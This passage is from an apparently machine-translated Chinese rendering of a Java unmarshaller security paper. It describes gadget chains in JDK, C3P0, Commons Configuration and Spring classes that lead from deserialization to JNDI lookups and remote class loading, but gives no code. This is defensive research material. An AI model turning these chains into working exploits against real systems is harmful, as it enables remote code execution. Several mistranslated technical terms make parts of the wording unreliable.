<div style="position:absolute;top:23572;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 使用</font><font color="#800000"><a href="https://translate.googleusercontent.com/translate_f#18"><font style="vertical-align: inherit;">4.3 中</font></a></font><font style="vertical-align: inherit;">描述的迭代器触发器</font></font><font color="#800000"><a href="https://translate.googleusercontent.com/translate_f#18"><font style="vertical-align: inherit;"></font></a></font><a href="https://translate.googleusercontent.com/translate_f#18"></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">.</font></font></nobr></div>
<div style="position:absolute;top:23594;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. ServiceLoader.LazyIterator 的 hasNext() 和 next() 触发枚举</font></font></nobr></div>
<div style="position:absolute;top:23614;left:201"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-&gt; 下一个（）。</font></font></nobr></div>
<div style="position:absolute;top:23635;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3. 调用 BindingEnumeration-&gt;next() 触发对第一个的 JNDI/RMI 查找</font></font></nobr></div>
<div style="position:absolute;top:23653;left:205"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">“名称”中的名称（见</font></font><font color="#800000"><a href="https://translate.googleusercontent.com/translate_f#17"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.1.2</font></font></a></font><a href="https://translate.googleusercontent.com/translate_f#17"></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">）。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:6px;font-family:Times">
<div style="position:absolute;top:23842;left:168"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">51</font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并且也不使用某些适配器替换它们</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:23905;left:439"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">19</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:24153;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="20"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 20 页</font></font></b></a></font></td></tr></tbody></table></div><font size="3" face="Times"><span style="font-size:15px;font-family:Times">
<div style="position:absolute;top:24313;left:167"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.5 com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:24352;left:173"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">适用于</font></font></b></nobr></div>
</span></font>
<font size="3" color="#800000" face="Times"><span style="font-size:12px;font-family:Times;color:#800000">
<div style="position:absolute;top:24387;left:174"><nobr><a href="https://translate.googleusercontent.com/translate_f#12"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">克里奥 (3.2.2)</font></font></a><font color="#000000" style="font-size:8px"><a href="https://translate.googleusercontent.com/translate_f#12"></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">† </font></font></font><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、</font></font></font><a href="https://translate.googleusercontent.com/translate_f#14"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">json-io (3.2.4) </font></font></a><font color="#000000"><a href="https://translate.googleusercontent.com/translate_f#14"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、</font></font></a> </font><a href="https://translate.googleusercontent.com/translate_f#15"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> XStream (3.2.5)</font></font></a></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:24428;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来自 Oracle/OpenJDK 标准库。</font><font style="vertical-align: inherit;">不是 java.io.Serializable，不是</font></font></nobr></div>
<div style="position:absolute;top:24446;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有一个默认构造函数，没有 bean setter。</font><font style="vertical-align: inherit;">非常类似于</font></font><font color="#800000"><a href="https://translate.googleusercontent.com/translate_f#19"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">BindingEnum (4.4)</font></font></a></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">但</font></font></nobr></div>
<div style="position:absolute;top:24463;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">允许使用任意的 DirContext。</font></font></nobr></div>
<div style="position:absolute;top:24489;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.使用迭代触发器，如</font></font><font color="#800000"><a href="https://translate.googleusercontent.com/translate_f#18"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.3所述</font></font></a></font><a href="https://translate.googleusercontent.com/translate_f#18"></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">.</font></font></nobr></div>
<div style="position:absolute;top:24511;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. ServiceLoader.LazyIterator 的 hasNext() 和 next() 触发枚举</font></font></nobr></div>
<div style="position:absolute;top:24531;left:201"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-&gt; 下一个（）。</font></font></nobr></div>
<div style="position:absolute;top:24552;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3. LazySearchEnumerationImpl-&gt;next() 调用 findNextMatch()。</font></font></nobr></div>
<div style="position:absolute;top:24574;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4. findNextMatch() 从嵌套的 'candidates' 枚举中获取下一个 Binding-</font></font></nobr></div>
<div style="position:absolute;top:24592;left:205"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">重刑。</font><font style="vertical-align: inherit;">绑定的值用作 getAttributes()</font></font></nobr></div>
<div style="position:absolute;top:24610;left:205"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">叫做。</font></font></nobr></div>
<div style="position:absolute;top:24632;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5. ContinuationDirContext-&gt;getAttributes() 调用ContinuationDirContext</font></font></nobr></div>
<div style="position:absolute;top:24652;left:201"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-&gt;getTargetContext() 依次调用 javax.naming.spi.NamingManager</font></font></nobr></div>
<div style="position:absolute;top:24670;left:201"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-&gt;getContext() 带有来自 javax.naming 的提供的 Reference 对象。</font></font></nobr></div>
<div style="position:absolute;top:24687;left:205"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ContinuationContext 中包含的CannotProceedException。</font><font style="vertical-align: inherit;">那个终极</font></font></nobr></div>
<div style="position:absolute;top:24704;left:205"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">相应地导致从指定的远程代码库加载和初始化一个类</font></font></nobr></div>
<div style="position:absolute;top:24722;left:205"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在参考。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:15px;font-family:Times">
<div style="position:absolute;top:24766;left:167"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.6 javax.imageio.ImageIO$ContainsFilter</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:24804;left:173"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">适用于</font></font></b></nobr></div>
</span></font>
<font size="3" color="#800000" face="Times"><span style="font-size:12px;font-family:Times;color:#800000">
<div style="position:absolute;top:24839;left:174"><nobr><a href="https://translate.googleusercontent.com/translate_f#12"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">克里奥 (3.2.2)</font></font></a><font color="#000000" style="font-size:8px"><a href="https://translate.googleusercontent.com/translate_f#12"></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">† </font></font></font><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">, </font></font></font><a href="https://translate.googleusercontent.com/translate_f#15"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">XStream (3.2.5)</font></font></a></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:24880;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来自 Oracle/OpenJDK 标准库。</font><font style="vertical-align: inherit;">不是 java.io.Serializable，是</font></font></nobr></div>
<div style="position:absolute;top:24898;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">没有默认构造函数，没有 bean setter。</font><font style="vertical-align: inherit;">需要能够恢复</font></font></nobr></div>
<div style="position:absolute;top:24918;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">java.lang.reflect.Method 实例。</font></font></nobr></div>
<div style="position:absolute;top:24942;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 使用</font><font color="#800000"><a href="https://translate.googleusercontent.com/translate_f#18"><font style="vertical-align: inherit;">4.3 中</font></a></font><font style="vertical-align: inherit;">描述的迭代器触发器</font></font><font color="#800000"><a href="https://translate.googleusercontent.com/translate_f#18"><font style="vertical-align: inherit;"></font></a></font><a href="https://translate.googleusercontent.com/translate_f#18"></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">.</font></font></nobr></div>
<div style="position:absolute;top:24964;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. javax.imageio.spi.FilterIterator-&gt;next() 调用FilterIterator$Filter</font></font></nobr></div>
<div style="position:absolute;top:24983;left:201"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-&gt;过滤器（）。</font></font></nobr></div>
<div style="position:absolute;top:25004;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3. javax.imageio.ImageIO$ContainsFilter-&gt;filter() 将调用提供的</font></font></nobr></div>
<div style="position:absolute;top:25022;left:205"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过 FilterIterator 的支持 Iterator 提供的对象上的方法。</font></font></nobr></div>
<div style="position:absolute;top:25167;left:439"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">20</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:25415;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="21"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 21 页</font></font></b></a></font></td></tr></tbody></table></div><font size="3" face="Times"><span style="font-size:15px;font-family:Times">
<div style="position:absolute;top:25575;left:167"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.7 Commons 配置 JNDIConfiguration</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:25614;left:173"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">适用于</font></font></b></nobr></div>
</span></font>
<font size="3" color="#800000" face="Times"><span style="font-size:12px;font-family:Times;color:#800000">
<div style="position:absolute;top:25647;left:174"><nobr><a href="https://translate.googleusercontent.com/translate_f#6"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SnakeYAML (3.1.1) </font></font></a><font color="#000000"><a href="https://translate.googleusercontent.com/translate_f#6"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、</font></font></a> </font><a href="https://translate.googleusercontent.com/translate_f#15"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> XStream (3.2.5)</font></font></a></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:25688;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">需要类路径上的公共配置。</font><font style="vertical-align: inherit;">不是 java.io.Serializable，</font></font></nobr></div>
<div style="position:absolute;top:25706;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有些没有默认构造函数，没有 bean setter。</font><font style="vertical-align: inherit;">需要额外的</font></font></nobr></div>
<div style="position:absolute;top:25724;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">集合或映射上的字段被恢复或能够调用任意构造函数</font></font></nobr></div>
<div style="position:absolute;top:25742;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">攻击者提供的数据。</font></font></nobr></div>
<div style="position:absolute;top:25767;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 几乎所有的方法调用，包括 Configuration(Map|Set) 上的 hashCode()</font></font></nobr></div>
<div style="position:absolute;top:25785;left:205"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">导致调用 Configuration-&gt;getKeys()。</font></font></nobr></div>
<div style="position:absolute;top:25808;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. JNDIConfiguration-&gt;getKeys() 通过 getBaseContext() 将执行一个</font></font></nobr></div>
<div style="position:absolute;top:25826;left:204"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">JNDI 查找攻击者提供的 URL。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:15px;font-family:Times">
<div style="position:absolute;top:25870;left:167"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.8 C3P0 JndiRefForwardingDataSource</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:25908;left:173"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">适用于</font></font></b></nobr></div>
</span></font>
<font size="3" color="#800000" face="Times"><span style="font-size:12px;font-family:Times;color:#800000">
<div style="position:absolute;top:25942;left:174"><nobr><a href="https://translate.googleusercontent.com/translate_f#6"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SnakeYAML (3.1.1) </font></font></a><font color="#000000"><a href="https://translate.googleusercontent.com/translate_f#6"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、</font></font></a> </font><a href="https://translate.googleusercontent.com/translate_f#7"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> jYAML (3.1.2) </font></font></a><font color="#000000"><a href="https://translate.googleusercontent.com/translate_f#7"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、</font></font></a> </font><a href="https://translate.googleusercontent.com/translate_f#9"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Jackson (3.1.6)</font></font></a></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:25983;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在类路径上需要 c3p0。</font><font style="vertical-align: inherit;">是包私有的，java.io.Serializable，有一个</font></font></nobr></div>
<div style="position:absolute;top:26000;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">默认构造函数，使用的属性也有 getter。</font><font style="vertical-align: inherit;">两个正确排序的二传手</font></font></nobr></div>
<div style="position:absolute;top:26018;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">代码执行需要调用。</font></font></nobr></div>
<div style="position:absolute;top:26044;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 将 'jndiName' 属性设置为 JNDI URI（参见</font></font><font color="#800000"><a href="https://translate.googleusercontent.com/translate_f#17"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.1.2</font></font></a></font><a href="https://translate.googleusercontent.com/translate_f#17"></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">）。</font></font></nobr></div>
<div style="position:absolute;top:26066;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 将“loginTimeout”属性设置为触发inner() 的任何内容。</font></font></nobr></div>
<div style="position:absolute;top:26089;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.inner() 触发 dereference() 对提供的数据执行 JNDI 查找</font></font></nobr></div>
<div style="position:absolute;top:26107;left:205"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">URI。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:15px;font-family:Times">
<div style="position:absolute;top:26151;left:167"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.9 C3P0 WrapperConnectionPoolDataSource</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:26189;left:173"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">适用于</font></font></b></nobr></div>
</span></font>
<font size="3" color="#800000" face="Times"><span style="font-size:12px;font-family:Times;color:#800000">
<div style="position:absolute;top:26222;left:174"><nobr><a href="https://translate.googleusercontent.com/translate_f#6"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SnakeYAML (3.1.1) </font></font></a><font color="#000000"><a href="https://translate.googleusercontent.com/translate_f#6"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、</font></font></a> </font><a href="https://translate.googleusercontent.com/translate_f#7"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> jYAML (3.1.2) </font></font></a><font color="#000000"><a href="https://translate.googleusercontent.com/translate_f#7"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、</font></font></a> </font><a href="https://translate.googleusercontent.com/translate_f#7"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> YamlBeans (3.1.3) </font></font></a><font color="#000000"><a href="https://translate.googleusercontent.com/translate_f#7"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、</font></font></a> </font><a href="https://translate.googleusercontent.com/translate_f#9"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Jackson (3.1.6)</font></font></a><font color="#000000"><a href="https://translate.googleusercontent.com/translate_f#9"></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">,</font></font></font></nobr></div>
<div style="position:absolute;top:26240;left:174"><nobr><a href="https://translate.googleusercontent.com/translate_f#8"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">BlazeDS (3.1.4) </font></font></a><font color="#000000"><a href="https://translate.googleusercontent.com/translate_f#8"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、</font></font></a> </font><a href="https://translate.googleusercontent.com/translate_f#8"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Red5 (3.1.5) </font></font></a><font color="#000000"><a href="https://translate.googleusercontent.com/translate_f#8"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、</font></font></a> </font><a href="https://translate.googleusercontent.com/translate_f#10"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Castor (3.1.7)</font></font></a></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:26281;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在类路径上需要 c3p0。</font><font style="vertical-align: inherit;">实现 java.io.Serializable，有一个默认值</font></font></nobr></div>
<div style="position:absolute;top:26299;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">构造函数（需要调用），使用的属性也有getter。</font><font style="vertical-align: inherit;">一个</font></font></nobr></div>
<div style="position:absolute;top:26317;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">setter 调用足以执行代码。</font></font></nobr></div>
<div style="position:absolute;top:26343;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.设置'userOverridesAsString'属性来触发PropertyChangeEvent</font></font></nobr></div>
<div style="position:absolute;top:26361;left:205"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在构造函数中注册的侦听器。</font></font></nobr></div>
<div style="position:absolute;top:26429;left:439"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:26677;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="22"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 22 页</font></font></b></a></font></td></tr></tbody></table></div><font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:26840;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 监听器调用 C3P0ImplUtils-&gt;parseUserOverridesAsString()</font></font></nobr></div>
<div style="position:absolute;top:26857;left:205"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">适当的价值。</font><font style="vertical-align: inherit;">其中一部分是十六进制解码的（将前 22 个字符剥离为</font></font></nobr></div>
<div style="position:absolute;top:26875;left:204"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最后一个）和反序列化（Java）。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">52</font></font></font></nobr></div>
<div style="position:absolute;top:26898;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3. com.mchange.v2.ser.IndirectlySerialized-&gt;getObject() 被调用，如果 de-</font></font></nobr></div>
<div style="position:absolute;top:26916;left:205"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">序列化对象实现该接口。</font></font></nobr></div>
<div style="position:absolute;top:26938;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4. com.mchange.v2.naming.ReferenceIndirector$ReferenceSerialized 是这样的</font></font></nobr></div>
<div style="position:absolute;top:26956;left:205"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一个实现。</font><font style="vertical-align: inherit;">它将远程类路径中的类实例化为 JNDI</font></font></nobr></div>
<div style="position:absolute;top:26975;left:205"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对象工厂。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">53</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:15px;font-family:Times">
<div style="position:absolute;top:27017;left:167"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.10 Spring Beans PropertyPathFactoryBean</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:27056;left:173"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">适用于</font></font></b></nobr></div>
</span></font>
<font size="3" color="#800000" face="Times"><span style="font-size:12px;font-family:Times;color:#800000">
<div style="position:absolute;top:27089;left:174"><nobr><a href="https://translate.googleusercontent.com/translate_f#6"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SnakeYAML (3.1.1) </font></font></a><font color="#000000"><a href="https://translate.googleusercontent.com/translate_f#6"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、</font></font></a> </font><a href="https://translate.googleusercontent.com/translate_f#8"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> BlazeDS (3.1.4) </font></font></a><font color="#000000"><a href="https://translate.googleusercontent.com/translate_f#8"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、</font></font></a> </font><a href="https://translate.googleusercontent.com/translate_f#9"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Jackson (3.1.6)</font></font></a></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:27130;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在类路径上需要 spring-beans 和 spring-context。</font><font style="vertical-align: inherit;">两种类型都涉及</font></font></nobr></div>
<div style="position:absolute;top:27148;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有一个默认构造函数。</font><font style="vertical-align: inherit;">SimpleJndiBeanFactory 没有实现 java.io。</font></font></nobr></div>
<div style="position:absolute;top:27167;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Serializable 和 properties 没有各自的 getter 方法。</font><font style="vertical-align: inherit;">春季 AOP</font></font></nobr></div>
<div style="position:absolute;top:27184;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">提供了至少两种可以替代 PropertyPathFactoryBean 的类型。</font></font></nobr></div>
<div style="position:absolute;top:27209;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 将 PropertyPathFactoryBean 的 'targetBeanName' 属性设置为</font></font></nobr></div>
<div style="position:absolute;top:27227;left:204"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">JNDI URI（见</font></font><font color="#800000"><a href="https://translate.googleusercontent.com/translate_f#17"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.1.2</font></font></a></font><a href="https://translate.googleusercontent.com/translate_f#17"></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">) 和 'propertyPath' 到非空的东西。</font></font></nobr></div>
<div style="position:absolute;top:27249;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 将 'beanFactory' 属性设置为 SimpleJndiBeanFactory 类型的对象</font></font></nobr></div>
<div style="position:absolute;top:27267;left:204"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">'shareableResources' 属性设置为包含 JNDI URI 的数组。</font></font></nobr></div>
<div style="position:absolute;top:27289;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3. setBeanFactory() 会检查目标 bean 是否是单例，它是</font></font></nobr></div>
<div style="position:absolute;top:27307;left:205"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">因为我们使它成为一个可共享的资源，并调用 BeanFactory-&gt;getBean()</font></font></nobr></div>
<div style="position:absolute;top:27325;left:205"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">豆名。</font></font></nobr></div>
<div style="position:absolute;top:27347;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4. 那会调用JndiTemplate-&gt;lookup()，触发InitialContext-&gt;lookup()。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:15px;font-family:Times">
<div style="position:absolute;top:27391;left:167"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.11 Spring AOP PartiallyComparableAdvisorHolder</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:27429;left:173"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">适用于</font></font></b></nobr></div>
</span></font>
<font size="3" color="#800000" face="Times"><span style="font-size:12px;font-family:Times;color:#800000">
<div style="position:absolute;top:27464;left:174"><nobr><a href="https://translate.googleusercontent.com/translate_f#12"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">克里奥 (3.2.2)</font></font></a><font color="#000000" style="font-size:8px"><a href="https://translate.googleusercontent.com/translate_f#12"></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">† </font></font></font><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">, </font></font></font><a href="https://translate.googleusercontent.com/translate_f#13"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Hessian/Burlap (3.2.3) </font></font></a><font color="#000000"><a href="https://translate.googleusercontent.com/translate_f#13"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">,</font></font></a> </font><a href="https://translate.googleusercontent.com/translate_f#15"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> XStream (3.2.5)</font></font></a></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:27505;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在类路径上需要 spring-aop 和 aspectj。</font><font style="vertical-align: inherit;">不需要或任意控制</font></font></nobr></div>
<div style="position:absolute;top:27523;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">structor 调用以及恢复非 java.io.Serializable 的能力。</font></font></nobr></div>
<div style="position:absolute;top:27548;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 在 PartiallyComparableAdvisorHolder 上触发 toString()。</font></font></nobr></div>
<div style="position:absolute;top:27570;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 在 PartiallyComparableAdvisorHolder-&gt;toString() (Advisor &amp; Ordered)</font></font></nobr></div>
<div style="position:absolute;top:27589;left:201"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-&gt;getOrder() 被调用。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:6px;font-family:Times">
<div style="position:absolute;top:27614;left:168"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">52</font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当然你可以在这里使用你喜欢的Java反序列化小工具，但我们不需要它</font></font></font></nobr></div>
<div style="position:absolute;top:27628;left:168"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">53</font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">本身，不使用默认的 JNDI 引用机制</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:27691;left:439"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">22</font></font></nobr></div>
</span></font>

